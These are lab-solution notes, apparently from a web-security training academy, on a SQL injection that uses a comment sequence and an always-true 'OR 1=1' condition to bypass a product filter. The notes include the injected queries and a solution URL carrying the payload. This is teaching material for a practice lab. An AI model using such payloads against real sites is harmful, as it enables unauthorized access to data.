
## SQL Injection 1:
### Analysis:
#### Original Query:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
```

-  This query selects all products from the `products` table where the `category` is 'Gifts' and the product is `released`.

#### Injected Query 1:

```sql
SELECT * FROM products WHERE category = 'Gifts' --' AND released = 1
```

- The `--` sequence is used to comment out the rest of the SQL query.
- The `AND released = 1` part is ignored, potentially displaying all products in the 'Gifts' category, regardless of their release status.

#### Injected Query 2:
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1 --' AND released = 1
```

- The condition `OR 1=1` is always true.


Solution : https://0a9e009b03fe6a7d80663a5b004a0029.web-security-academy.net/filter?category=Gift%27+OR+1=1--